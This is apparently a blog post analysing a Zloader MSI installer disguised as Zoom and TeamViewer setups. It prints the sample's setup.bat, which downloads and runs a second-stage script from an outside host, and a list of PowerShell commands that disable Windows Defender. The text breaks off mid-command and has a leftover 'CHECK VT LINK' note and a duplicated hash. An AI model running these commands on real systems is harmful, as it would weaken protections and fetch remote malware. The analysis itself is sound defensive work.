@@ -1,0 +1,635 @@
+I"�><h2 id="campaign-information">Campaign Information</h2>
+<p>In 2021 September, I came across a recent sample for Zloader. After finishing with most of the static analysis steps, I noticed there is already existing <a href="https://assets.sentinelone.com/sentinellabs/SentinelLabs-Zloader">research on this by SentinelOne</a>, but I thought carrying on with the analysis will be good practice and use of my time.</p>
+
+<p>Delivery of the malicious file is through malwaretisment according to SentinelOne.</p>
+
+<p>Users searching for Zoom(and likely Teamviewer) installers are shown with paid ads and download and execute the installer directly from the ads.</p>
+
+<h2 id="technical-analysis">Technical analysis</h2>
+
+<p>It seems, that we are working with an MSI (Microsoft Installer Package) file, based on the file signature according to <a href="https://filesignatures.net/index.php?page=search&amp;search=MSI&amp;mode=EXT">filesignatures.net</a>:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">D0</span> <span class="no">CF</span> <span class="mi">11</span> <span class="no">E0</span> <span class="no">A1</span> <span class="no">B1</span> <span class="mi">1</span><span class="no">A</span> <span class="no">E1</span> </code></pre></figure>
+
+<p><img src="/assets/img/zloader_msi1.png" alt="zloader_msi1" /></p>
+
+<p>MSI doesn’t really masquarade much of the content, so we can see plenty of strings in cleartext.</p>
+
+<p>Although, the same initial info about the components can be viewed with simply opening the file in an archive manager, such as 7z, a few years ago I came across a nice tool called <a href="https://docs.microsoft.com/en-us/windows/win32/msi/orca-exe">Orca.exe</a>, which is now part of the <em>Windows SDK Components for Windows Installer Developers</em>. You can find the legitimate individual executable as well with a bit of searching.</p>
+
+<p>After loading the .msi file, we are presented with the following:
+<img src="/assets/img/zloader_orca1.png" alt="zloader_orca1" />
+We have plenty of menu options, and the .dll and other components are immediately revealed.</p>
+
+<p>The unique ComponentID GUIDs are meant to provide a mapping to the absolute path of the files included. The MSI file format combines these .dlls, .exes and the .bat file into one installation package.</p>
+
+<p>After a bit of browsing we could see some interesting information about the binary:
+<img src="/assets/img/zloader_orca2.png" alt="zloader_orca2" /></p>
+
+<p>The binary data itself points to:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">WixCA</span>	<span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">AppData</span><span class="p">\</span><span class="no">Local</span><span class="p">\</span><span class="no">Temp</span><span class="p">\</span><span class="no">ODB3452</span><span class="p">.</span><span class="nf">tmp</span></code></pre></figure>
+
+<p>Another small snippet that comes with the package is the icon:
+<img src="/assets/img/zloader_orca3.png" alt="zloader_orca3" /></p>
+
+<p>With the value of another .tmp file.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Logo</span><span class="p">.</span><span class="nf">ico</span>	<span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">AppData</span><span class="p">\</span><span class="no">Local</span><span class="p">\</span><span class="no">Temp</span><span class="p">\</span><span class="no">ODB1082</span><span class="p">.</span><span class="nf">tmp</span></code></pre></figure>
+
+<p>Another hint that the installation uses Java:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">INSTALLFOLDER</span>	<span class="no">ROOTDIRECTORY</span>	<span class="n">lxpzwdtx</span><span class="o">|</span><span class="no">Oracle</span> <span class="no">Java</span> <span class="no">SE</span>
+<span class="no">TARGETDIR</span>		<span class="no">SourceDir</span>
+<span class="no">ROOTDIRECTORY</span>	<span class="no">ProgramFilesFolder</span>	<span class="n">esdeopkx</span><span class="o">|</span><span class="no">Sun</span> <span class="no">Technology</span> <span class="no">Network</span>
+<span class="no">ProgramFilesFolder</span>	<span class="no">TARGETDIR</span>	<span class="no">PROGRA</span><span class="o">~</span><span class="mi">1</span><span class="o">|</span><span class="no">ProgramFilesFolder</span><span class="p">:</span><span class="o">.</span>
+<span class="no">DesktopFolder</span>	<span class="no">INSTALLFOLDER</span>	<span class="no">S9PHPU</span><span class="o">~</span><span class="mi">1</span><span class="o">|</span><span class="no">DesktopFolder</span><span class="ss">:s9phpus2</span><span class="o">|</span><span class="no">DesktopFolder</span></code></pre></figure>
+
+<p>It seems that the file was compiled using the Windows Installer XML (WiX) toolset. The <a href="https://wixtoolset.org/">Wix Toolset</a> is used to create Windows installation packages which can be downloaded as a Visual Studio extension.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">The</span> <span class="no">WiX</span> <span class="n">toolset</span> <span class="n">supports</span> <span class="n">building</span> <span class="n">the</span> <span class="n">following</span> <span class="n">types</span> <span class="n">of</span> <span class="no">Windows</span> <span class="no">Installer</span> <span class="ss">files:
+	</span><span class="err">•</span> <span class="no">Installer</span> <span class="p">(.</span><span class="nf">msi</span><span class="p">)</span>
+	<span class="err">•</span> <span class="no">Patches</span> <span class="p">(.</span><span class="nf">msp</span><span class="p">)</span>
+	<span class="err">•</span> <span class="no">Merge</span> <span class="no">Modules</span> <span class="p">(.</span><span class="nf">msm</span><span class="p">)</span>
+	<span class="err">•</span> <span class="no">Transforms</span> <span class="p">(.</span><span class="nf">mst</span><span class="p">)</span></code></pre></figure>
+
+<p>Only by looking at the Orca tool’s output we can recognize the field Action and the target.
+<img src="/assets/img/zloader_orca4.png" alt="zloader_orca4" /></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="s2">"cmd.exe"</span> <span class="o">/</span><span class="no">C</span> <span class="s2">"[INSTALLFOLDER]setup.bat
+"</span><span class="p">[</span><span class="no">SystemFolder</span><span class="p">]</span><span class="n">cmd</span><span class="p">.</span><span class="nf">exe</span><span class="s2">" /C "</span><span class="p">[</span><span class="no">INSTALLFOLDER</span><span class="p">]</span><span class="n">setup</span><span class="p">.</span><span class="nf">bat</span><span class="s2">"</span></code></pre></figure>
+
+<p>These look like <a href="https://wixtoolset.org/documentation/manual/v3/wixdev/extensions/authoring_custom_actions.html">Wix Custom Actions</a> that are aiding installation steps.</p>
+
+<p>The XML structure and the documentations with the GUIDs will help to understand this process better.  They can be used to add further custom actions to installers - at this point unclear whether a way of simply defining the whole packaging and install process, or actually bundling malware to an existing binary. we will keep an eye out for this.</p>
+
+<p>The same file has been submitted with different filenames to VirusTotal:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="mi">34</span><span class="n">d026</span><span class="p">.</span><span class="nf">msi</span>
+<span class="no">Zoom</span><span class="p">.</span><span class="nf">msi</span>
+<span class="no">Team</span><span class="o">-</span><span class="no">Viewer</span><span class="p">.</span><span class="nf">msi</span></code></pre></figure>
+
+<p>So presumably the threat actors are using several different malwartisment campaigns for different popular desktop software.</p>
+
+<p>The InstallExecuteSequence provides useful information from Orca is the installation chain of events.</p>
+
+<p>The function names that looked like Win32 API functions, are eventually undocumented, and I assume are also part of the Wix tool.</p>
+
+<p>The Register.exe is removed after being executed:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">ALLFILES</span>	<span class="no">Register</span><span class="p">.</span><span class="nf">exe</span>	<span class="o">*</span><span class="p">.</span><span class="nf">*</span>	<span class="no">INSTALLFOLDER</span>	<span class="mi">3</span></code></pre></figure>
+
+<p>Some further information about the Java version:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">ServiceInstaller</span>	<span class="no">PatchService</span>	<span class="no">Sun</span> <span class="no">Technology</span> <span class="no">Network</span> <span class="no">Oracle</span> <span class="no">Java</span> <span class="no">Service</span>	<span class="mi">16</span>	<span class="mi">2</span>	<span class="mi">1</span>			<span class="p">[</span><span class="no">SERVICEACCOUNT</span><span class="p">]</span>			<span class="no">Service</span><span class="p">.</span><span class="nf">exe</span>	<span class="no">Patching</span> <span class="no">Java</span> <span class="n">activation</span></code></pre></figure>
+
+<p>Another table provides information about the validation actions:</p>
+
+<p><img src="/assets/img/zloader_orca5.png" alt="zloader_orca5" /></p>
+
+<p>The whole Orca content is also exportable in .idt, or Windows Installer Database Text Archive Files, and .ibd, or MySQL InnoDB Table files. But in fact the .ibd files seems to directly contain the binaries in Logo.ico.ibd and WinxCA.ibd.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="no">Orca_export</span><span class="o">&gt;</span><span class="n">tree</span> <span class="sr">/F
+Folder PATH listing
+Volume serial number is E411-13D6
+C:.
+│   AdminExecuteSequence.idt
+│   AdminUISequence.idt
+│   AdvtExecuteSequence.idt
+│   Binary.idt
+│   Component.idt
+│   CustomAction.idt
+│   Directory.idt
+│   Feature.idt
+│   FeatureComponents.idt
+│   File.idt
+│   Icon.idt
+│   InstallExecuteSequence.idt
+│   InstallUISequence.idt
+│   LaunchCondition.idt
+│   Media.idt
+│   MsiFileHash.idt
+│   PatchPackage.idt
+│   Property.idt
+│   RemoveFile.idt
+│   ServiceConfig.idt
+│   ServiceControl.idt
+│   ServiceInstall.idt
+│   Upgrade.idt
+│   _Validation.idt
+│
+├───Binary
+│       WixCA.ibd
+│
+└───Icon
+        Logo.ico.ibd</span></code></pre></figure>
+
+<p>Besides the aforementioned files, we can notice a Binary and an Icon file. The binary contains an executable:</p>
+
+<p><img src="/assets/img/zloader_exported1.png" alt="zloader_exported1" /></p>
+
+<p>A quick check also reveals that the certificate used for signing the original MSI file has been explicitly revoked:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span> <span class="o">&gt;</span> <span class="no">Get</span><span class="o">-</span><span class="no">AuthenticodeSignature</span> <span class="o">-</span><span class="no">FilePath</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">2</span><span class="n">c0d8fc0740598fa97c5d1b21edb011c8026740b77029d29c20f3275438ebfbd</span>
+
+
+    <span class="no">Directory</span><span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span>
+
+
+<span class="no">SignerCertificate</span>                         <span class="no">Status</span>                                 <span class="no">Path</span>
+<span class="o">-----------------</span>                         <span class="o">------</span>                                 <span class="o">----</span>
+<span class="mi">4</span><span class="no">CB2518DAAE44CBB33D17F35B392F26A1DEE6CA5</span>  <span class="no">Valid</span>                                  <span class="mi">2</span><span class="n">c0d8fc0740598fa97c5d1b21edb011c802</span><span class="o">...</span>
+
+
+<span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span> <span class="o">&gt;</span> <span class="no">C</span><span class="p">:\</span><span class="no">ProgramData</span><span class="p">\</span><span class="n">chocolatey</span><span class="p">\</span><span class="n">lib</span><span class="p">\</span><span class="n">sysinternals</span><span class="p">\</span><span class="n">tools</span><span class="p">\</span><span class="n">sigcheck</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">a</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">2</span><span class="n">c0d8fc0740598fa97c5d1b21edb011c8026740b77029d29c20f3275438ebfbd</span>
+
+<span class="no">Sigcheck</span> <span class="n">v2</span><span class="o">.</span><span class="mi">82</span> <span class="o">-</span> <span class="no">File</span> <span class="n">version</span> <span class="n">and</span> <span class="n">signature</span> <span class="n">viewer</span>
+<span class="no">Copyright</span> <span class="p">(</span><span class="no">C</span><span class="p">)</span> <span class="mi">2004</span><span class="o">-</span><span class="mi">2021</span> <span class="no">Mark</span> <span class="no">Russinovich</span>
+<span class="no">Sysinternals</span> <span class="o">-</span> <span class="n">www</span><span class="p">.</span><span class="nf">sysinternals</span><span class="p">.</span><span class="nf">com</span>
+
+<span class="n">c</span><span class="p">:\</span><span class="n">users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">2</span><span class="ss">c0d8fc0740598fa97c5d1b21edb011c8026740b77029d29c20f3275438ebfbd:
+        </span><span class="no">Verified</span><span class="p">:</span>       <span class="no">A</span> <span class="n">certificate</span> <span class="n">was</span> <span class="n">explicitly</span> <span class="n">revoked</span> <span class="n">by</span> <span class="n">its</span> <span class="n">issuer</span><span class="o">.</span>
+        <span class="no">File</span> <span class="ss">date:      </span><span class="mi">10</span><span class="p">:</span><span class="mi">13</span> <span class="no">AM</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span>
+        <span class="no">Publisher</span><span class="p">:</span>      <span class="no">Flyintellect</span> <span class="no">Inc</span><span class="o">.</span>
+        <span class="no">Company</span><span class="p">:</span>        <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Description</span><span class="p">:</span>    <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Product</span><span class="p">:</span>        <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Prod</span> <span class="ss">version:   </span><span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">File</span> <span class="ss">version:   </span><span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">MachineType</span><span class="p">:</span>    <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Binary</span> <span class="no">Version</span><span class="p">:</span> <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Original</span> <span class="no">Name</span><span class="p">:</span>  <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Internal</span> <span class="no">Name</span><span class="p">:</span>  <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Copyright</span><span class="p">:</span>      <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Comments</span><span class="p">:</span>       <span class="n">n</span><span class="o">/</span><span class="n">a</span>
+        <span class="no">Entropy</span><span class="p">:</span>        <span class="mf">7.628</span></code></pre></figure>
+
+<p>Flyintellect Inc. is a company registered in Canada very recently, according to several websites, such as <a href="https://www.canadacompanyregistry.com/companies/flyintellect-inc/">canadacompanyregistry.com</a></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Corporation</span> <span class="no">Number</span><span class="p">:</span> <span class="mi">13146341</span>
+<span class="no">Corporate</span> <span class="no">Name</span><span class="p">:</span> <span class="no">Flyintellect</span> <span class="no">Inc</span><span class="o">.</span>
+<span class="no">Governing</span> <span class="no">Legislation</span><span class="p">:</span> <span class="no">Canada</span> <span class="no">Business</span> <span class="no">Corporations</span> <span class="no">Act</span> <span class="mi">29</span> <span class="no">June</span> <span class="mi">2021</span> <span class="p">(</span><span class="no">Tuesday</span><span class="p">)</span>
+<span class="no">Date</span> <span class="n">of</span> <span class="no">Registration</span><span class="p">:</span> <span class="mi">29</span> <span class="no">June</span> <span class="mi">2021</span> <span class="p">(</span><span class="no">Tuesday</span><span class="p">)</span>
+<span class="no">Registered</span> <span class="no">Office</span> <span class="no">Address</span><span class="p">:</span> <span class="mi">74</span> <span class="no">Tessler</span> <span class="no">Crescent</span> <span class="no">Brampton</span> <span class="no">ON</span> <span class="no">L6X</span> <span class="mi">4</span><span class="no">P7</span> <span class="no">CANADA</span>
+<span class="no">Address</span> <span class="no">Date</span><span class="p">:</span> <span class="mi">29</span> <span class="no">June</span> <span class="mi">2021</span> <span class="p">(</span><span class="no">Tuesday</span><span class="p">)</span>
+<span class="no">Status</span><span class="p">:</span> <span class="no">Active</span>
+<span class="no">Status</span> <span class="no">Date</span><span class="p">:</span> <span class="mi">29</span> <span class="no">June</span> <span class="mi">2021</span> <span class="p">(</span><span class="no">Tuesday</span><span class="p">)</span>
+<span class="no">Number</span> <span class="n">of</span> <span class="no">Directors</span><span class="p">:</span> <span class="no">Minimum</span> <span class="mi">1</span> <span class="no">Maximum</span> <span class="mi">99</span></code></pre></figure>
+
+<p>Some further checks on Imports/Exports and Dependencies using CFF Explorer:
+<img src="/assets/img/zloader_cffexplorer.png" alt="zloader_cffexplorer" /></p>
+
+<p>The identified MZ file from the Orca export in the .ibd format is <a href="https://www.virustotal.com/gui/file/c8d190d5be1efd2d52f72a72ae9dfa3940ab3faceb626405959349654fe18b74">legitimate wixca.dll</a> used by the Windows Installer XML Toolset.</p>
+
+<p>Now let’s jump to the rest of the extracted content(most of the files are legitimate windows .dlls):</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span> <span class="o">&gt;</span> <span class="no">Get</span><span class="o">-</span><span class="no">ChildItem</span> <span class="o">.</span><span class="p">\</span><span class="mi">7</span><span class="n">z_export</span><span class="p">\</span> <span class="o">-</span><span class="no">Force</span> <span class="o">|</span> <span class="no">Select</span><span class="o">-</span><span class="no">Object</span> <span class="no">FullName</span><span class="p">,</span> <span class="no">CreationTime</span><span class="p">,</span> <span class="no">LastAccessTime</span><span class="p">,</span> <span class="no">LastWriteTime</span><span class="p">,</span> <span class="no">Mode</span><span class="p">,</span> <span class="no">Length</span>
+
+<span class="o">...</span> <span class="n">results</span> <span class="n">omitted</span> <span class="o">...</span>
+
+
+<span class="no">FullName</span>       <span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">7</span><span class="n">z_export</span><span class="p">\</span><span class="n">lic_service</span><span class="p">.</span><span class="nf">exe</span>
+<span class="no">CreationTime</span>   <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastAccessTime</span> <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastWriteTime</span>  <span class="p">:</span> <span class="mi">8</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">10</span><span class="p">:</span><span class="mo">02</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>
+<span class="no">Mode</span>           <span class="p">:</span> <span class="o">-</span><span class="n">a</span><span class="o">----</span>
+<span class="no">Length</span>         <span class="p">:</span> <span class="mi">211968</span>
+
+<span class="no">FullName</span>       <span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">7</span><span class="n">z_export</span><span class="p">\</span><span class="no">Register</span><span class="p">.</span><span class="nf">exe</span>
+<span class="no">CreationTime</span>   <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastAccessTime</span> <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastWriteTime</span>  <span class="p">:</span> <span class="mi">8</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">10</span><span class="p">:</span><span class="mo">02</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>
+<span class="no">Mode</span>           <span class="p">:</span> <span class="o">-</span><span class="n">a</span><span class="o">----</span>
+<span class="no">Length</span>         <span class="p">:</span> <span class="mi">211968</span>
+
+<span class="no">FullName</span>       <span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">7</span><span class="n">z_export</span><span class="p">\</span><span class="n">setup</span><span class="p">.</span><span class="nf">bat</span>
+<span class="no">CreationTime</span>   <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastAccessTime</span> <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastWriteTime</span>  <span class="p">:</span> <span class="mi">8</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">2</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">38</span> <span class="no">PM</span>
+<span class="no">Mode</span>           <span class="p">:</span> <span class="o">-</span><span class="n">a</span><span class="o">----</span>
+<span class="no">Length</span>         <span class="p">:</span> <span class="mi">203</span>
+
+<span class="no">FullName</span>       <span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">7</span><span class="n">z_export</span><span class="p">\</span><span class="no">SyncMonitor</span><span class="p">.</span><span class="nf">dll</span>
+<span class="no">CreationTime</span>   <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastAccessTime</span> <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastWriteTime</span>  <span class="p">:</span> <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2019</span> <span class="mi">7</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">12</span> <span class="no">AM</span>
+<span class="no">Mode</span>           <span class="p">:</span> <span class="o">-</span><span class="n">a</span><span class="o">----</span>
+<span class="no">Length</span>         <span class="p">:</span> <span class="mi">85040</span>
+
+<span class="no">FullName</span>       <span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">7</span><span class="n">z_export</span><span class="p">\</span><span class="n">vcruntime140</span><span class="p">.</span><span class="nf">dll</span>
+<span class="no">CreationTime</span>   <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastAccessTime</span> <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastWriteTime</span>  <span class="p">:</span> <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2019</span> <span class="mi">1</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">12</span> <span class="no">PM</span>
+<span class="no">Mode</span>           <span class="p">:</span> <span class="o">-</span><span class="n">a</span><span class="o">----</span>
+<span class="no">Length</span>         <span class="p">:</span> <span class="mi">85040</span>
+
+<span class="no">FullName</span>       <span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5011762757926912</span><span class="p">\</span><span class="mi">7</span><span class="n">z_export</span><span class="p">\</span><span class="n">vcruntime140_1</span><span class="p">.</span><span class="nf">dll</span>
+<span class="no">CreationTime</span>   <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastAccessTime</span> <span class="p">:</span> <span class="mi">9</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2021</span> <span class="mi">11</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">33</span> <span class="no">AM</span>
+<span class="no">LastWriteTime</span>  <span class="p">:</span> <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2019</span> <span class="mi">1</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">12</span> <span class="no">PM</span>
+<span class="no">Mode</span>           <span class="p">:</span> <span class="o">-</span><span class="n">a</span><span class="o">----</span>
+<span class="no">Length</span>         <span class="p">:</span> <span class="mi">43056</span></code></pre></figure>
+
+<p>Based on hash analysis, timestamps, and filenames the following files attract of our interest:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">lic_service</span><span class="p">.</span><span class="nf">exe</span><span class="p">,</span> <span class="no">Register</span><span class="p">.</span><span class="nf">exe</span> <span class="n">and</span> <span class="no">Setup</span><span class="p">.</span><span class="nf">bat</span><span class="o">.</span></code></pre></figure>
+
+<p>These files were also recent in VT at the time of the analysis, and the former two share the same hash.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">lic_service</span><span class="p">.</span><span class="nf">exe</span><span class="p">,</span> <span class="no">Register</span><span class="p">.</span><span class="nf">exe</span> 
+<span class="no">SHA256</span><span class="p">:</span>  <span class="mi">678</span><span class="n">f9d715220512a823ca45d7e8545a1288728d8d47243e072e17049441cdd2b</span> </code></pre></figure>
+
+<p><a href="https://www.virustotal.com/gui/file/678f9d715220512a823ca45d7e8545a1288728d8d47243e072e17049441cdd2b">VirusTotal 1/65</a></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Setup</span><span class="p">.</span><span class="nf">bat</span> 
+<span class="no">SHA256</span><span class="p">:</span>  <span class="mi">678</span><span class="n">f9d715220512a823ca45d7e8545a1288728d8d47243e072e17049441cdd2b</span> </code></pre></figure>
+
+<p><a href="https://www.virustotal.com/gui/file/678f9d715220512a823ca45d7e8545a1288728d8d47243e072e17049441cdd2b">VirusTotal 17/57</a>
+??????????????? CHECK VT LINK</p>
+
+<p>Setup.bat content:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">cd</span> <span class="sr">/d %~dp0
+cd "%USERPROFILE%\AppData\Roaming
+powershell Invoke-WebRequest https:/</span><span class="o">/</span><span class="n">websekir</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">g00glbat</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">processingSetRequestBat</span><span class="o">/</span><span class="p">?</span><span class="n">servername</span><span class="o">=</span><span class="n">msi</span> <span class="o">-</span><span class="no">OutFile</span> <span class="n">updatescript</span><span class="p">.</span><span class="nf">bat</span>
+<span class="n">cmd</span> <span class="sr">/c updatescript.bat</span></code></pre></figure>
+
+<p>The .bat file sends a webrequest and acquires a further file, which was not available at the time of the analysis, and this is when I started to research and found the SentinelOne article.</p>
+
+<p>The update.bat appears to have the following content per the SentinelOne research:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">powershell</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">command</span> <span class="err">“</span><span class="no">Add</span><span class="o">-</span><span class="no">MpPreference</span> <span class="o">-</span><span class="no">ExclusionExtension</span> <span class="err">“</span><span class="p">.</span><span class="nf">exe</span><span class="err">””</span><span class="n">cmd</span> <span class="sr">/c powershell.exe -command “Set-MpPreference -MAPSReporting 0”powershell.exe -command “Set-MpPreference -PUAProtection disable”powershell.exe -command “Set-MpPreference -EnableControlledFolderAccess Disabled”powershell.exe -command “Set-MpPreference -DisableRealtimeMonitoring $true”powershell.exe -command “Set-MpPreference -DisableBehaviorMonitoring $true”powershell.exe -command “Set-MpPreference -DisableIOAVProtection $true”powershell.exe -command “Set-MpPreference -DisablePrivacyMode $true”powershell.exe -command “Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true”powershell.exe -command “Set-MpPreference -DisableArchiveScanning $true”powershell.exe -command “Set-MpPreference -DisableIntrusionPreventionSystem $true”powershell.exe -command “Set-MpPreference -DisableScriptScanning $true”powershell.exe -command “Set-MpPreference -SubmitSamplesConsent 2”powershell.exe -command 